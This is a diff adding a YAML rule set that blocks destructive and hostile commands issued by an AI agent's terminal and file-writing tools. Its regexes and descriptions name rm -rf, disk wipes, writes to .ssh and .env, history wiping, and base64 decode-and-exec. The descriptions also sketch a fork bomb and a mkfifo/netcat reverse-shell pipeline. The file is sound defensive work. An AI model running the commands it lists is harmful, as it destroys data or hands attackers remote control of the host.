@@ -1,0 +1,426 @@
+version: "1.0"
+name: "hermes-hard-blocks"
+description: >
+  Hard block rules for Hermes tool calls. Covers actual Hermes tool names:
+  terminal, mcp__terminal, write_file, mcp__write_file, patch, mcp__patch.
+  These are critical-severity patterns that should never execute unattended.
+
+rules:
+  - id: block-rm-rf
+    name: Block recursive force-delete
+    description: Block rm -rf style commands from terminal tools.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '(^|[\s;&|`$\(])rm\s+(-[^\s]*f[^\s]*r[^\s]*|-[^\s]*r[^\s]*f[^\s]*|-rf|-fr)\s'
+
+  - id: block-disk-format
+    name: Block disk formatting commands
+    description: Block mkfs, dd to device, wipefs, shred on devices.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\b(mkfs\.|dd\s+if=/dev|wipefs\s|shred\s+/dev)\b'
+
+  - id: block-ssh-key-write
+    name: Block writes to .ssh directory
+    description: Block any write or patch targeting .ssh paths.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - write_file
+      - mcp__write_file
+      - patch
+      - mcp__patch
+    condition_groups:
+      - - field: arguments.path
+          operator: contains
+          value: '.ssh/'
+      - - field: arguments.path
+          operator: ends_with
+          value: '.ssh'
+
+  - id: block-hermes-env-write
+    name: Block writes to Hermes .env secrets file
+    description: Block direct writes to ~/.hermes/.env.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - write_file
+      - mcp__write_file
+    condition_groups:
+      - - field: arguments.path
+          operator: matches
+          value: '\.hermes/\.env$'
+
+  - id: block-find-delete
+    name: Block find -delete
+    description: Block 'find ... -delete' which can recursively remove matched files.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bfind\b.*\s-delete\b'
+
+  - id: block-truncate-zero
+    name: Block truncate to zero size
+    description: Block 'truncate -s0' / 'truncate --size=0' which empties files in place.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\btruncate\b\s+(-s\s*0(\s|$|[^0-9])|--size[=\s]+0(\s|$|[^0-9]))'
+
+  - id: block-python-fs-delete-home
+    name: Block python -c filesystem delete targeting HOME/.hermes
+    description: >
+      Block inline python/python3 -c using os.remove, os.unlink, os.rmdir,
+      shutil.rmtree, or os.removedirs that targets $HOME or ~/.hermes.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: 'python3?\b.*-c\b.*(os\.(remove|unlink|rmdir|removedirs)|shutil\.rmtree).*(\$HOME|~/?\.hermes|/var/home/rainbow|os\.environ\[.HOME)'
+
+  - id: block-chmod-recursive-home
+    name: Block recursive chmod on HOME/.hermes
+    description: Block 'chmod -R' targeting $HOME, the home dir, or ~/.hermes.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bchmod\b\s+(-[^\s]*R[^\s]*|--recursive)\s+.*(\$HOME|~(/|\s|$)|~/?\.hermes|/var/home/rainbow)'
+
+  - id: block-dd-zero-to-file
+    name: Block dd from /dev/zero or /dev/null to a disk file
+    description: >
+      Block 'dd if=/dev/zero' or 'dd if=/dev/null' writing to a file path
+      (of=/path...), which zeroes/empties files. Device targets covered by
+      block-disk-format.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bdd\b\s+.*if=/dev/(zero|null).*\sof=(?!/dev/)'
+      - - field: arguments.command
+          operator: matches
+          value: '\bdd\b\s+.*of=(?!/dev/)[^\s]+.*if=/dev/(zero|null)'
+
+  - id: block-history-wipe
+    name: Block shell history deletion
+    description: Block commands that wipe bash/zsh history.
+    enabled: true
+    severity: high
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '(history\s+-[cw]|>\s*~/?\.(bash|zsh|sh)_history|rm\s+.*_history)'
+
+  - id: block-base64-exec
+    name: Block base64-decoded shell execution
+    description: >
+      Block commands that decode base64 and pipe/eval into a shell.
+      Classic obfuscation pattern to bypass string-based veto rules.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: 'base64\s+(-d|--decode)[^|]*\|\s*(ba)?sh'
+      - - field: arguments.command
+          operator: matches
+          value: 'echo\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+(-d|--decode)[^|]*\|\s*(ba)?sh'
+
+  - id: block-eval-env-expand
+    name: Block eval of environment variable expansion
+    description: >
+      Block eval/$(...) / eval "$(..." patterns commonly used to execute
+      commands stored in env vars, bypassing pattern-based veto checks.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\beval\s+["''\$`]'
+      - - field: arguments.command
+          operator: matches
+          value: '\beval\s+\$\('
+
+  - id: block-python-script-delete-home
+    name: Block python script files that delete home/hermes paths
+    description: >
+      Block python3 <script.py> calls where the script path is in /tmp, /var/tmp,
+      or any path outside the project, used to deliver obfuscated deletion logic
+      that bypasses the inline -c check.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: 'python3?\s+(/tmp/|/var/tmp/|\$TMPDIR)[^\s]+'
+
+  # ── Pass-2 additions (2026-07-01): coverage gaps found in follow-up audit ────
+
+  - id: block-fork-bomb
+    name: Block shell fork bombs
+    description: >
+      Block classic bash fork-bomb patterns like :(){ :|:& };: and named
+      variants that recursively self-invoke into a background pipe, exhausting
+      process tables and forcing a hard reboot.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\(\s*\)\s*\{\s*[A-Za-z_:][A-Za-z0-9_:]*\s*\|\s*[A-Za-z_:][A-Za-z0-9_:]*\s*&\s*\}\s*;'
+      - - field: arguments.command
+          operator: matches
+          value: ':\(\)\s*\{.*:\|:.*&.*\}'
+
+  - id: block-crontab-remove-all
+    name: Block crontab -r (removes all scheduled jobs)
+    description: >
+      Block 'crontab -r', which silently deletes the user's entire crontab with
+      no confirmation. A single flag wipes every scheduled automation.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bcrontab\b\s+(-[^\s]*\b)?-?r(\s|$)'
+
+  - id: block-chown-recursive-home
+    name: Block recursive chown on HOME/.hermes
+    description: >
+      Block 'chown -R' targeting $HOME, the home dir, or ~/.hermes. Recursively
+      rewriting ownership can lock the user out of their own files or hand them
+      to another uid. Companion to block-chmod-recursive-home.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bchown\b\s+(-[^\s]*R[^\s]*|--recursive)\s+.*(\$HOME|~(/|\s|$)|~/?\.hermes|/var/home/rainbow)'
+
+  - id: block-hermes-config-write
+    name: Block direct writes/patches to Hermes config.yaml
+    description: >
+      Block write_file/patch targeting ~/.hermes/config.yaml directly. Config
+      must be changed via 'hermes config set' so validation, migration, and
+      backups run. Direct edits can corrupt the file or bypass schema checks.
+    enabled: true
+    severity: high
+    action: block
+    tools:
+      - write_file
+      - mcp__write_file
+      - patch
+      - mcp__patch
+    condition_groups:
+      - - field: arguments.path
+          operator: matches
+          value: '\.hermes/config\.yaml$'
+
+  - id: block-mv-to-devnull
+    name: Block moving paths into /dev/null
+    description: >
+      Block 'mv <path> /dev/null', which destroys the source by replacing the
+      null device or discarding the file, a data-loss pattern that evades rm rules.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bmv\b\s+[^\s]+\s+/dev/null(\s|$)'
+
+  - id: block-git-destructive-wipe
+    name: Block git clean -fdx and git reset --hard on tracked trees
+    description: >
+      Block 'git clean' with force+directory+ignored flags (-fdx / -fdX / -xdf),
+      which permanently deletes all untracked AND ignored files including local
+      env/state that git never protected. Recovery is impossible.
+    enabled: true
+    severity: high
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bgit\s+clean\b\s+(-[^\s]*[fF][^\s]*[dxX][^\s]*|-[^\s]*[dxX][^\s]*[fF][^\s]*)'
+
+  - id: block-node-perl-fs-delete-home
+    name: Block node/perl/ruby inline filesystem deletes on HOME/.hermes
+    description: >
+      Companion to block-python-fs-delete-home. Block inline node -e, perl -e,
+      or ruby -e using unlink/rmSync/rmdir/rmtree that targets $HOME or ~/.hermes,
+      closing the non-python interpreter bypass.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\b(node|perl|ruby)\b.*-e\b.*(unlink|rmSync|rmdirSync|rmdir|rmtree|remove_tree|FileUtils\.rm).*(\$HOME|(process\.)?env\.HOME|~/?\.hermes|/var/home/rainbow)'
+
+  # ── Pass-3 additions (2026-07-01): upstream adversarial threat patterns ──────
+
+  - id: block-reverse-shell
+    name: Block reverse / bind shell patterns
+    description: >
+      Block reverse and bind shell constructs: bash/sh interactive shells wired to
+      /dev/tcp or /dev/udp, and inline python/perl/ruby socket-to-shell payloads.
+      These give an attacker remote interactive control of the host.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '/dev/(tcp|udp)/[^\s/]+/[0-9]+'
+      - - field: arguments.command
+          operator: matches
+          value: '\b(ba)?sh\b\s+-i\b.*(>&|0>&1|\|\s*nc\b|\|\s*ncat\b)'
+      - - field: arguments.command
+          operator: matches
+          value: '\b(python3?|perl|ruby)\b.*(socket\.socket|IO::Socket|TCPSocket).*(subprocess|/bin/(ba)?sh|exec|system|pty\.spawn)'
+
+  - id: block-nc-exec-backdoor
+    name: Block netcat/ncat/socat exec backdoors
+    description: >
+      Block netcat-family listeners/clients that execute a shell on connect
+      (nc -e, ncat --exec/-e, socat EXEC/SYSTEM), the canonical backdoor shape.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\b(nc|ncat)\b[^\n]*\s(-e|--exec|-c)\s'
+      - - field: arguments.command
+          operator: matches
+          value: '\bsocat\b[^\n]*(EXEC:|SYSTEM:)'
+
+  - id: block-mkfifo-backdoor
+    name: Block mkfifo-based named-pipe shell backdoors
+    description: >
+      Block the mkfifo + shell + network relay pattern (mkfifo /tmp/f; cat /tmp/f
+      | sh -i | nc host port > /tmp/f) used to build a reverse shell out of a
+      named pipe, evading a single-command nc -e block.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bmkfifo\b[^\n]*(\|\s*(nc|ncat)\b|(ba)?sh\s+-i)'
+      - - field: arguments.command
+          operator: matches
+          value: '\bmkfifo\b[\s\S]*\b(nc|ncat|telnet)\b[\s\S]*(ba)?sh'
+
+  - id: block-obfuscated-decode-exec
+    name: Block openssl/xxd/python decode piped to shell
+    description: >
+      Companion to block-base64-exec. Block additional decode-then-execute
+      channels: openssl base64 -d, xxd -r, and python base64/codecs decode piped
+      into a shell or eval, closing non-coreutils obfuscation bypasses.
+    enabled: true
+    severity: critical
+    action: block
+    tools:
+      - terminal
+      - mcp__terminal
+    condition_groups:
+      - - field: arguments.command
+          operator: matches
+          value: '\bopenssl\b\s+(enc|base64)\b[^|]*\s-d\b[^|]*\|\s*(ba)?sh'
+      - - field: arguments.command
+          operator: matches
+          value: '\bxxd\b\s+-r[^|]*\|\s*(ba)?sh'
+      - - field: arguments.command
+          operator: matches
+          value: 'python3?\b.*(base64\.b64decode|codecs\.decode)[^\n]*\|\s*(ba)?sh'
